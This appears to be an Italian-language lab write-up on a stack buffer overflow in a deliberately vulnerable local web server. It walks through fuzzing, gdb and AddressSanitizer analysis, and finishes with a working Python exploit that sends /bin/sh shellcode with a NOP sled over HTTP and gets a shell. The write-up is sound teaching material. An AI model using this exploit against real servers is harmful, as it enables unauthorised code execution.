# Writeup - stack-buffer-overflow - lab1

*ASLR disabled*
*DEP disabled*
*stack protection disabled*

## Overwrite Return Address EIP ( like 1996 )

### Discovery Manuale
Eseguire il tiny-lab1 tramite gdb:
```
$ gdb tiny-lab1                                             
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from tiny-lab1...done.
(gdb) r
```

La fase di discovery effettuata tramite il Fuzzing dei parametri ricevuti dal server utilizzando un tool di pattern generation ( https://github.com/rhpco/RHPCOpattern ) risulta utile per identificare il numero di bytes necessari per effettuare overflow.
```
$ curl http://localhost:9999/`python RHPCO-pattern.py generate 500`
File not found%                                                                                
$ curl http://localhost:9999/`python RHPCO-pattern.py generate 550`
curl: (52) Empty reply from server
$curl http://localhost:9999/`python RHPCO-pattern.py generate 550`

```
- La prima esecuzione risulta ricevere risposta corretta dal webserver.
- La seconda esecuzione risulta ricevere risposta vuota dal webserver indice di mal funzionamento
- La terza esecuzione risulta non ricevere risposta in quanto l'applicazione è risultata andare in Segmentation Fault, dimostrazione dell'avvenuto overflow come mostrato dall'esecuzione del server tramite gdb
```
accept request, fd is 14, pid is 16961

Program received signal SIGSEGV, Segmentation fault.
0x080499b4 in log_access (status=404, c_addr=0x41307341, req=0xffffc8b8) at tiny.c:303
303         printf("%s:%d %d - %s\n", inet_ntoa(c_addr->sin_addr),
(gdb) info registers
eax            0xffffc8b8       -14152
ecx            0x41307341       1093694273
edx            0x194    404
ebx            0x0      0
esp            0xffffc7e0       0xffffc7e0
ebp            0xffffc818       0xffffc818
esi            0x41307341       1093694273
edi            0x0      0
eip            0x80499b4        0x80499b4 <log_access+20>
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
```
Per effettuare il conteggio dei bytes relativi al pattern iniettato utilizzare il tool di generazione pattern sul valore `0x41307341`
```
python RHPCO-pattern.py search 0x41307341
Pattern 0x41307341 found at position 540
```

Si può approfondire l'analisi effettuando il fuzzing usando i caratteri A (x41) e B (x42) lo scopo è quello di capire quanti byte di OFFSET servono per sovrascrivere i 4 byte del registro EIP.
Eseguendoad esempio:
```
curl http://localhost:9999/`python -c 'print "A"*530+"BBBB"'`
```


E quindi esegueremo il corretto OFFSET incrementato in modo da ottenere i 4byte del registro EIP sovrascritti con i 4byte delle BBBB (42424242)
```
curl http://localhost:9999/`python -c 'print "A"*532+"BBBB"'`
```
in gdb otterremo infatti
```
File not found127.0.0.1:36798 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) Quit
``` 
Il crash `Segmentation fault` su `0x42424242` che rappresentano esattamente i 4byte sovrascritti dalle ultime `BBBB` iniettate si può ancora verificare il tutto tramite il comando gdb `info registers`:
```
(gdb) info registers
eax            0x22f    559
ecx            0x1      1
edx            0xf7fae890       -134551408
ebx            0x0      0
esp            0xffffcb30       0xffffcb30
ebp            0x41414141       0x41414141
esi            0x41414141       1094795585
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x10286  [ PF SF IF RF ]
```
Utile a dimostrare come siano stati sovrascritti il Base Pointer `EBP` con `0x41414141`, cioè la sezione del nostro `OFFSET` con le `A (x41))` ed il valore `0x42424242` per il registro `EIP` con esattamente i 4 bytes delle 4 `B (x42)`

## Discovery AddressSanitizer
Compilare il server tramite il flag `-fsanitize=address -g` come eseguido dal Makefile:
```
$ make addressanitizer
clang-7 -m32 -fno-stack-protector -z execstack -no-pie  -g  -fsanitize=address -g -o tiny-lab1-addressanitizer tiny.c 
...
```
Ed eseguire il webserver:
```
./tiny-lab1-addressanitizer
listen on port 9999, fd is 3
child pid is 23079
```

Effettuare il semplice Fuzzing della URL richiesta e verificare il crash del server con i dettagli forniti dall'instrumentation in fase di compilazione dell'addresssanitizer.
Fuzzing:
```
$ curl http://localhost:9999/`python -c 'print "A"*600'`           
curl: (52) Empty reply from server
```
Address Sanitizer Output:
```
./tiny-lab1-addressanitizer
listen on port 9999, fd is 3
child pid is 23079
accept request, fd is 14, pid is 23078
=================================================================
==23078==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffc0ca78 at pc 0x08182515 bp 0xffc0b3e8 sp 0xffc0b3dc
WRITE of size 1 at 0xffc0ca78 thread T0
    #0 0x8182514 in url_decode /home/rhpco/tiny-webserver-exploiting/lab1/app/tiny.c:259:21
    #1 0x8182e08 in parse_request /home/rhpco/tiny-webserver-exploiting/lab1/app/tiny.c:298:5
    #2 0x8183e60 in process /home/rhpco/tiny-webserver-exploiting/lab1/app/tiny.c:349:5
    #3 0x8184bdc in main /home/rhpco/tiny-webserver-exploiting/lab1/app/tiny.c:435:9
    #4 0xf7c14e80 in __libc_start_main (/lib32/libc.so.6+0x18e80)
    #5 0x8060b01 in _start (/home/rhpco/tiny-webserver-exploiting/lab1/app/tiny-lab1-addressanitizer+0x8060b01)

Address 0xffc0ca78 is located in stack of thread T0 at offset 536 in frame
    #0 0x8183cef in process /home/rhpco/tiny-webserver-exploiting/lab1/app/tiny.c:346

  This frame has 2 object(s):
    [16, 536) 'req' (line 348) <== Memory access at offset 536 overflows this variable
    [672, 760) 'sbuf' (line 351)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /home/rhpco/tiny-webserver-exploiting/lab1/app/tiny.c:259:21 in url_decode
Shadow bytes around the buggy address:
  0x3ff818f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ff81900: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 00 00
  0x3ff81910: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ff81920: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ff81930: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x3ff81940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[f2]
  0x3ff81950: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x3ff81960: f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f3 f3 f3 f3 f3
  0x3ff81970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ff81980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ff81990: f1 f1 00 00 f2 f2 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==23078==ABORTING
```

L'output dimostra il verificarsi di uno `stack-buffer-overflow` per lo stacktrace fornito e i bytes di offset del frame d'esecuzione
`[16, 536) 'req' (line 348) <== Memory access at offset 536 overflows this variable`.


## Construction
A questo punto sappiamo che abbiamo la possibilità di utilizzare `532` bytes per initettare il nostro `SHELLCODE`

Visualizzando lo stato dello stack tramite il seguente comando `x/600x $esp-600`
che significa:
- fammi vedere 600 indirizzi in formato hex partendo da `$esp-600`, infatti il valore di `$esp` risulta essere ( ricordandoci che stack cresce verso il basso )
```
(gdb) x/x $esp
0xffffcb30:     0x00000000
```
mentre
```
(gdb) x/x $esp-600
0xffffc8d8:     0x00000000
```
e infatti
```
>>> 0xffffcb30-0xffffc8d8
600

```

Quindi analizzando lo stack partendo da `$esp-600` abbiamo:
```
(gdb) x/600x $esp-600
0xffffc8d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffc8e8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffc8f8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffc908:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffc918:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc928:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc938:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc948:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc958:     0x41414141      0x41414141      0x41414141      0x41414141
[...]
```

E subito vediamo che partendo da `0xffffc918` iniziano le `0x41414141` che son oesattamente le `A` iniettate tramite l'injection, proseguendo
la visualizzazione dello stack:
```
0xffffcaf8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcb08:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcb18:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcb28:     0x41414141      0x42424242      0x00000000      0xffffcc90
0xffffcb38:     0xffffcb7c      0x080485c6      0x03721d18      0xffffcbec
```
Si vede come il payload termini con gli `0x42424242` che rappresentano i 4 bytes di `B` del payload che nello stack si trova all'indirizzo
```
(gdb) x/x 0xffffcb2C
0xffffcb2c:     0x42424242
```
infatti contando partendo dalla riga `0xffffcb28` salendo di 4 byte ( ...8, ...9, ...A, ...B ) ci ritroviamo con l'ultimo byte con valore `C` ed infatti è `0xffffcb2c`.

### Exploiting
In base agli elementi identificati:
- si hanno a disposizione `532` bytes si spazio per iniettare uno shellcode.
- si può utilizzare la tecnica del `NOP Sleed` per iniettare una serie di `x90` cioè `NOP Codes` che significano `NO OPERATION` in modo da avere bytes che rappresentano codice che non esegue alcunchè con lo scopo di effettuare overwrite del Return Address in questa zona di memoria così da non dover essere estramente precisi nello sovrascrivere il ret address perchè dal momento che si jmpa in tale area l'esecuzione di ogni `NOP` avverebbe 1 alla volta effettuando lo scivolamento verso l'area contenente i bytes dello shellcode e la loro esecuzione.

Quindi l'area di payload exploit risulta essere così:
```
[AAA...AAA] + [NOP...NOP] + SHELLCODE + [NOP...NOP]+ SHELLCODE Address
```
il tutto calcolato come segue
```
PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + NOP*(NOP_SIZE/2)+ EIP
```
#### Identificare Return Address

Per identificare il corretto `SHELLCODE Address` da usare per sovrascrivere il registro `EIP` si può effettuare il fuzzing con un valore base come `BBBB` e identificare nello stack gli indirizzi di memoria contenenti i NOP codes `x90`. Tale tecnica funziona perchè ASLR risulta disabilitato, fosse abilitato tale indirizzo risulterebbe randomcizzato e quindi ogni esecuzione sarebbe differente rendendo impossibile la predicibilità.

Tramite il seguente exploit contenente `0x42424242` come indirizzo da sovrascrivere RET address possiamo effettuare l'analisi:

exploit_lab1.py
```
import struct
import urllib
SIZE = 532
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE_SIZE = 25
NOP = "\x90"
NOP_SIZE = 100
PADDING = "\x41"
PADDING_SIZE = SIZE - SHELLCODE_SIZE - NOP_SIZE
EIP = struct.pack("I", 0x42424242)
PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + NOP*(NOP_SIZE/2)+ EIP
print urllib.quote_plus(PAYLOAD)
```
Effettuando debug tramite gdb come segue:
```
(gdb) r
Starting program: /home/rhpco/sandbox/addresssanitizer/tiny-web-server/lab1/tiny-lab1 
listen on port 9999, fd is 3
child pid is 8194

```
E successivamente lanciare l'exploit:
```
$ curl http://localhost:9999/`python exploit_lab1.py`

```
Otteniamo il crash atteso e possiamo effettuare l'analisi dello stack alla ricerco di zone contenenti `NOP Codes` relativi il `NOP Sleed` iniettato, cioè la zona contenente 100 `x90` nello stack:
```
File not found127.0.0.1:50760 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������1�Ph//shh/bin��P��S���
                                   ��������������������������������������������������BBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
(gdb) x/600x $esp-600
0xffffc918:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffc928:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffc938:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffc948:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffc958:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffc968:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffc978:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffc988:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffc998:	0x41414141	0x41414141	0x41414141	0x41414141
[...]
0xffffcac8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcad8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcae8:	0x41414141	0x90414141	0x90909090	0x90909090
0xffffcaf8:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcb08:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcb18:	0x90909090	0x90909090	0x50c03190	0x732f2f68
0xffffcb28:	0x622f6868	0xe3896e69	0x53e28950	0x0bb0e189
0xffffcb38:	0x909080cd	0x90909090	0x90909090	0x90909090
0xffffcb48:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcb58:	0x90909090	0x90909090	
```

Ecco che al termine del padding tramite `A (x41)` abbiamo i `NOP Codes` a partire da 
```0xffffcae8:	0x41414141	0x90414141	0x90909090	0x90909090```
e successivamente lo shellcode e poi nuovamente alcuni nop codes proprio come atteso dall'exploit proposto.
A questo punto risulta evidente come possiamo scegliere un indirizzo dello stack qualsiasi di questa prima zona di `NOP Codes` come ad esempio `0xffffcaf8`. 
Questo sarà il valore che useremo per effettuare overwrite del `EIP`, jampare in quella zona di `NOP sleed` e sucessivamente scivolare fino l'esecuzione dello shellcode iniettato.

Di seguito exploit aggiornato:
exploit_lab1.py
```
import struct
import urllib
SIZE = 532
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE_SIZE = 25
NOP = "\x90"
NOP_SIZE = 100
PADDING = "\x41"
PADDING_SIZE = SIZE - SHELLCODE_SIZE - NOP_SIZE
EIP = struct.pack("I", 0xffffcaf8)
PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + NOP*(NOP_SIZE/2)+ EIP
print urllib.quote_plus(PAYLOAD)

```
E di seguito la dimostrazione del funzionamento:
```
curl http://localhost:9999/`python exploit_lab1.py`
```

Exploitation
```
./tiny-lab1 
listen on port 9999, fd is 3
child pid is 9845
accept request, fd is 4, pid is 9844
HTTP/1.1 404 Not found
Content-length: 14

File not found127.0.0.1:50842 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������1�Ph//shh/bin��P��S���
                                   ������������������������������������������������������
$ uname -a
Linux darksun 4.15.0-47-generic #50-Ubuntu SMP Wed Mar 13 10:44:52 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
$ 

```
( notare che potrebber osserci differenze di offset tra run del codice vulnerabile attraverso `gdb` o meno)


// rhpco